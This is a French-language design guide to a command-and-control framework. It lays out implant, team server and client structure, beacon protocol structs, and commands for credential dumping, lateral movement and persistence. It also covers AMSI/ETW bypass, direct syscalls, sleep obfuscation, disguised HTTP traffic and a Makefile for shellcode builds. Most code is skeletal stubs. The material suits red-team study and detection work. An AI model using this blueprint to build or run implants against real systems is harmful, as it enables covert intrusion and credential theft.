# Architecture C2 - Guide Complet

> Ce guide documente l'architecture d'un C2 moderne basé sur l'analyse de frameworks réels (Cobalt Strike, Sliver, Havoc, Mythic).

---

## Vue d'ensemble

```
┌─────────────────────────────────────────────────────────────────────┐
│                           OPERATEUR                                  │
│                    (Client GUI / CLI)                               │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│                         TEAM SERVER                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌────────────┐ │
│  │   REST API  │  │  WebSocket  │  │   Database  │  │   Logging  │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └────────────┘ │
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    LISTENER MANAGER                          │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────────────┐ │   │
│  │  │  HTTP/S │  │   DNS   │  │   SMB   │  │  External C2   │ │   │
│  │  └─────────┘  └─────────┘  └─────────┘  └─────────────────┘ │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
                                │
                    ┌───────────┴───────────┐
                    ▼                       ▼
            ┌─────────────┐         ┌─────────────┐
            │  REDIRECTOR │         │  REDIRECTOR │
            │  (Proxy)    │         │  (CDN)      │
            └─────────────┘         └─────────────┘
                    │                       │
                    └───────────┬───────────┘
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│                           IMPLANTS                                   │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                 │
│  │   Beacon    │  │   Beacon    │  │   Beacon    │                 │
│  │  (Windows)  │  │   (Linux)   │  │   (macOS)   │                 │
│  └─────────────┘  └─────────────┘  └─────────────┘                 │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Composants principaux

### 1. Team Server (Serveur central)

```
team_server/
├── main.c                    # Entry point
├── config.h                  # Configuration
├── server/
│   ├── http_server.c         # Serveur HTTP/HTTPS
│   ├── dns_server.c          # Serveur DNS
│   ├── smb_server.c          # Named pipes
│   └── tcp_server.c          # Raw TCP
├── api/
│   ├── rest_api.c            # API REST pour clients
│   ├── websocket.c           # Real-time updates
│   └── auth.c                # Authentication
├── core/
│   ├── session_manager.c     # Gestion des beacons
│   ├── task_queue.c          # Queue de tâches
│   ├── crypto.c              # Chiffrement
│   └── protocol.c            # Protocol parser
├── listeners/
│   ├── listener_base.c       # Interface commune
│   ├── http_listener.c
│   ├── https_listener.c
│   ├── dns_listener.c
│   └── smb_listener.c
├── database/
│   ├── db.c                  # SQLite wrapper
│   ├── sessions.c            # Session storage
│   ├── tasks.c               # Task history
│   └── logs.c                # Logging
└── utils/
    ├── logging.c
    ├── config.c
    └── utils.c
```

### 2. Implant/Beacon

```
implant/
├── main.c                    # Entry point minimal
├── config.h                  # Build-time config
├── core/
│   ├── beacon.c              # Main loop
│   ├── checkin.c             # Initial registration
│   ├── tasking.c             # Task execution
│   └── sleep.c               # Sleep/jitter
├── comms/
│   ├── http.c                # HTTP/S transport
│   ├── dns.c                 # DNS transport
│   ├── smb.c                 # SMB transport
│   └── crypto.c              # Encryption
├── commands/
│   ├── shell.c               # Command execution
│   ├── file.c                # File operations
│   ├── process.c             # Process management
│   ├── inject.c              # Process injection
│   ├── token.c               # Token manipulation
│   ├── lateral.c             # Lateral movement
│   └── persistence.c         # Persistence
├── evasion/
│   ├── syscalls.c            # Direct syscalls
│   ├── unhook.c              # NTDLL unhooking
│   ├── amsi.c                # AMSI bypass
│   ├── etw.c                 # ETW patching
│   └── sleep_obf.c           # Sleep obfuscation
└── utils/
    ├── api_resolve.c         # Dynamic API resolution
    ├── strings.c             # String obfuscation
    └── memory.c              # Memory operations
```

### 3. Client/Operator

```
client/
├── main.c                    # CLI interface
├── gui/                      # Optional GUI
├── api/
│   ├── client.c              # Server communication
│   └── commands.c            # Command builder
├── modules/
│   ├── sessions.c            # Session management
│   ├── listeners.c           # Listener management
│   └── payloads.c            # Payload generation
└── utils/
    ├── display.c             # Output formatting
    └── config.c              # Client config
```

---

## Protocol de communication

### Format de message

```c
// Header (16 bytes)
typedef struct __attribute__((packed)) {
    uint32_t magic;           // 0xDEADBEEF
    uint32_t session_id;      // Beacon ID
    uint16_t msg_type;        // Message type
    uint16_t flags;           // Encryption, compression
    uint32_t payload_len;     // Payload length
} MSG_HDR;

// Message types
enum MSG_TYPE {
    MSG_CHECKIN     = 0x01,   // Initial check-in
    MSG_BEACON      = 0x02,   // Heartbeat
    MSG_TASK        = 0x03,   // Task from server
    MSG_RESULT      = 0x04,   // Task result
    MSG_FILE        = 0x05,   // File transfer
    MSG_EXIT        = 0xFF    // Terminate
};

// Check-in payload
typedef struct __attribute__((packed)) {
    uint32_t os_version;
    uint32_t arch;            // 32 or 64
    uint32_t pid;
    uint32_t integrity;       // Low/Medium/High/System
    char     hostname[64];
    char     username[64];
    char     domain[64];
    char     process[128];
    uint8_t  internal_ip[4];
} CHECKIN_DATA;

// Task structure
typedef struct __attribute__((packed)) {
    uint32_t task_id;
    uint16_t command;
    uint16_t flags;
    uint32_t data_len;
    uint8_t  data[];          // Command-specific data
} TASK_PKT;

// Result structure
typedef struct __attribute__((packed)) {
    uint32_t task_id;
    uint32_t status;          // Success/Error
    uint32_t data_len;
    uint8_t  data[];          // Result data
} RESULT_PKT;
```

### Command IDs

```c
enum COMMAND {
    // Basic
    CMD_NOP          = 0x00,
    CMD_SLEEP        = 0x01,
    CMD_EXIT         = 0x02,

    // Execution
    CMD_SHELL        = 0x10,
    CMD_POWERSHELL   = 0x11,
    CMD_EXECUTE      = 0x12,
    CMD_EXECUTE_ASM  = 0x13,  // Execute shellcode

    // File System
    CMD_PWD          = 0x20,
    CMD_CD           = 0x21,
    CMD_LS           = 0x22,
    CMD_CAT          = 0x23,
    CMD_UPLOAD       = 0x24,
    CMD_DOWNLOAD     = 0x25,
    CMD_RM           = 0x26,
    CMD_MKDIR        = 0x27,

    // Process
    CMD_PS           = 0x30,
    CMD_KILL         = 0x31,
    CMD_INJECT       = 0x32,
    CMD_SPAWN        = 0x33,

    // Network
    CMD_IFCONFIG     = 0x40,
    CMD_NETSTAT      = 0x41,
    CMD_PORTSCAN     = 0x42,

    // Credentials
    CMD_HASHDUMP     = 0x50,
    CMD_MIMIKATZ     = 0x51,
    CMD_KERBEROS     = 0x52,

    // Lateral
    CMD_PSEXEC       = 0x60,
    CMD_WMIEXEC      = 0x61,
    CMD_WINRM        = 0x62,
    CMD_SSH          = 0x63,

    // Persistence
    CMD_PERSIST_REG  = 0x70,
    CMD_PERSIST_SVC  = 0x71,
    CMD_PERSIST_SCH  = 0x72,

    // Evasion
    CMD_UNHOOK       = 0x80,
    CMD_BLOCKDLLS    = 0x81,
    CMD_PPID_SPOOF   = 0x82,

    // Pivot
    CMD_SOCKS        = 0x90,
    CMD_RPORTFWD     = 0x91,
    CMD_LINK         = 0x92   // SMB beacon linking
};
```

---

## Encryption Layer

### Key Exchange

```c
// 1. Beacon generates RSA-2048 keypair
// 2. Server public key embedded in beacon
// 3. Beacon encrypts its public key with server pubkey
// 4. Server sends AES-256 session key encrypted with beacon pubkey
// 5. All further comms use AES-256-GCM

typedef struct {
    uint8_t  server_pubkey[294];  // DER encoded RSA-2048
    uint8_t  session_key[32];     // AES-256 key
    uint8_t  session_iv[12];      // GCM IV (incremented)
    uint32_t msg_counter;         // Replay protection
} CRYPTO_CTX;

// Encrypt message
void encrypt_msg(CRYPTO_CTX* ctx, uint8_t* data, uint32_t len, uint8_t* out) {
    // AES-256-GCM
    // IV = base_iv XOR counter
    // Increment counter after each message
}
```

### Message Flow

```
┌─────────┐                              ┌─────────┐
│ BEACON  │                              │ SERVER  │
└────┬────┘                              └────┬────┘
     │                                        │
     │  1. RSA_Encrypt(beacon_pubkey)        │
     │ ────────────────────────────────────► │
     │                                        │
     │  2. RSA_Encrypt(session_key)          │
     │ ◄──────────────────────────────────── │
     │                                        │
     │  3. AES_GCM(checkin_data)             │
     │ ────────────────────────────────────► │
     │                                        │
     │  4. AES_GCM(tasks)                    │
     │ ◄──────────────────────────────────── │
     │                                        │
     │  5. AES_GCM(results)                  │
     │ ────────────────────────────────────► │
     │                                        │
```

---

## HTTP/S Transport

### Request Format

```c
// GET request (beacon check-in)
// Cookie: session=<base64(encrypted_data)>
// Or hidden in:
// - URI path parameters
// - POST body
// - Custom headers

// Response (tasks)
// Hidden in:
// - HTML comments <!-- base64 -->
// - JavaScript variable
// - Fake image (steganography)
// - JSON response

// Example malleable profile
typedef struct {
    char* uri;                    // "/api/v1/status"
    char* verb;                   // "GET" or "POST"
    char* host_header;            // "cdn.microsoft.com"
    char* user_agent;             // Edge UA
    char* content_type;           // "application/json"

    // Data hiding
    char* data_prepend;           // "{'status': '"
    char* data_append;            // "'}"
    char* cookie_name;            // "session"
} HTTP_PROFILE;
```

### Jitter & Sleep

```c
typedef struct {
    uint32_t sleep_time;          // Base sleep (ms)
    uint8_t  jitter;              // Jitter percentage (0-50)
} SLEEP_CONFIG;

uint32_t get_sleep_time(SLEEP_CONFIG* cfg) {
    uint32_t jitter_range = (cfg->sleep_time * cfg->jitter) / 100;
    uint32_t jitter = rand() % (jitter_range * 2) - jitter_range;
    return cfg->sleep_time + jitter;
}
```

---

## Database Schema

```sql
-- Sessions/Beacons
CREATE TABLE sessions (
    id          TEXT PRIMARY KEY,
    external_ip TEXT,
    internal_ip TEXT,
    hostname    TEXT,
    username    TEXT,
    domain      TEXT,
    os          TEXT,
    arch        TEXT,
    pid         INTEGER,
    process     TEXT,
    integrity   TEXT,
    first_seen  DATETIME,
    last_seen   DATETIME,
    sleep       INTEGER,
    jitter      INTEGER,
    listener_id TEXT,
    status      TEXT  -- active/dead/exited
);

-- Tasks
CREATE TABLE tasks (
    id          TEXT PRIMARY KEY,
    session_id  TEXT,
    operator    TEXT,
    command     INTEGER,
    args        TEXT,
    status      TEXT,  -- pending/sent/complete/error
    created     DATETIME,
    sent        DATETIME,
    completed   DATETIME,
    result      BLOB,
    FOREIGN KEY(session_id) REFERENCES sessions(id)
);

-- Listeners
CREATE TABLE listeners (
    id          TEXT PRIMARY KEY,
    name        TEXT,
    type        TEXT,  -- http/https/dns/smb
    bind_addr   TEXT,
    bind_port   INTEGER,
    config      TEXT,  -- JSON config
    status      TEXT,
    created     DATETIME
);

-- Credentials
CREATE TABLE credentials (
    id          TEXT PRIMARY KEY,
    type        TEXT,  -- hash/plaintext/ticket
    domain      TEXT,
    username    TEXT,
    data        TEXT,
    source      TEXT,
    session_id  TEXT,
    created     DATETIME
);

-- Downloads
CREATE TABLE downloads (
    id          TEXT PRIMARY KEY,
    session_id  TEXT,
    remote_path TEXT,
    local_path  TEXT,
    size        INTEGER,
    hash        TEXT,
    created     DATETIME
);
```

---

## Implant Main Loop

```c
// Beacon main loop pattern
int beacon_main() {
    // 1. Initialize
    resolve_apis();           // Dynamic API resolution
    init_crypto();            // Setup encryption
    init_comms();             // Setup transport

    // 2. Initial check-in
    CHECKIN_DATA checkin;
    gather_system_info(&checkin);

    if(!do_checkin(&checkin)) {
        return 1;  // Failed to register
    }

    // 3. Main loop
    while(g_running) {
        // Sleep with jitter
        sleep_obfuscated(get_sleep_time(&g_config));

        // Check for tasks
        TASK_PKT* tasks = NULL;
        int count = 0;

        if(fetch_tasks(&tasks, &count)) {
            // Execute each task
            for(int i = 0; i < count; i++) {
                RESULT_PKT result;
                execute_task(&tasks[i], &result);
                send_result(&result);
            }
            free(tasks);
        }
    }

    return 0;
}

// Task dispatcher
void execute_task(TASK_PKT* task, RESULT_PKT* result) {
    result->task_id = task->task_id;
    result->status = STATUS_SUCCESS;

    switch(task->command) {
        case CMD_SHELL:
            cmd_shell(task->data, task->data_len, result);
            break;
        case CMD_DOWNLOAD:
            cmd_download(task->data, task->data_len, result);
            break;
        case CMD_INJECT:
            cmd_inject(task->data, task->data_len, result);
            break;
        case CMD_SLEEP:
            g_config.sleep_time = *(uint32_t*)task->data;
            break;
        case CMD_EXIT:
            g_running = 0;
            break;
        default:
            result->status = STATUS_UNKNOWN_CMD;
    }
}
```

---

## Evasion Patterns

### API Resolution

```c
// Hash-based API resolution (no strings in IAT)
typedef struct {
    HMODULE kernel32;
    HMODULE ntdll;

    // Resolved at runtime
    fn_VirtualAlloc         VirtualAlloc;
    fn_VirtualProtect       VirtualProtect;
    fn_CreateThread         CreateThread;
    fn_NtAllocateVirtualMemory  NtAllocateVirtualMemory;
    // ... more
} API_TABLE;

API_TABLE g_api;

void resolve_apis() {
    g_api.kernel32 = get_module_by_hash(H_KERNEL32);
    g_api.ntdll = get_module_by_hash(H_NTDLL);

    g_api.VirtualAlloc = get_proc_by_hash(g_api.kernel32, H_VIRTUALALLOC);
    // ... resolve all needed APIs
}
```

### Direct Syscalls

```c
// Syscall stub template
NTSTATUS NtAllocateVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    // mov r10, rcx
    // mov eax, SSN
    // syscall
    // ret
}
```

### Sleep Obfuscation

```c
// Foliage / Ekko pattern
void sleep_obfuscated(DWORD ms) {
    // 1. Create timer queue timer
    // 2. Register callback that:
    //    a. Encrypts beacon memory
    //    b. Changes permissions to RW
    // 3. Sleep
    // 4. Another timer:
    //    a. Changes back to RX
    //    b. Decrypts beacon memory
}
```

---

## Build System

```makefile
# Makefile for C2

CC = x86_64-w64-mingw32-gcc
CFLAGS = -Os -s -fno-ident -fno-asynchronous-unwind-tables
LDFLAGS = -nostdlib -Wl,--no-seh

# Implant
implant: implant/*.c
    $(CC) $(CFLAGS) $(LDFLAGS) -o implant.exe $^

# Shellcode extraction
shellcode: implant
    objcopy -O binary -j .text implant.exe implant.bin

# Server
server: server/*.c
    gcc -o server $^ -lpthread -lsqlite3 -lssl -lcrypto

# Client
client: client/*.c
    gcc -o client $^ -lncurses
```

---

## Operational Security

### Redirectors

```
Internet ──► CDN (CloudFlare) ──► Redirector (VPS) ──► Team Server
                                        │
                            iptables rules:
                            - Only allow C2 traffic
                            - Block scanners
                            - Log everything
```

### Malleable C2

```c
// Change traffic profile without recompiling
typedef struct {
    // HTTP
    char* get_uri[4];         // ["/api", "/status", "/update", NULL]
    char* post_uri[4];
    char* headers[8];         // Custom headers

    // Data transforms
    int   base64;             // Base64 encode
    int   netbios;            // NetBIOS encode
    int   mask;               // XOR mask

    // Timing
    int   min_sleep;
    int   max_sleep;
    int   jitter;
} MALLEABLE_PROFILE;
```

---

## Références

- Cobalt Strike User Guide
- Sliver C2 Source (GPLv3)
- Havoc Framework
- Mythic C2
- MDSec Research
- SpecterOps Blog
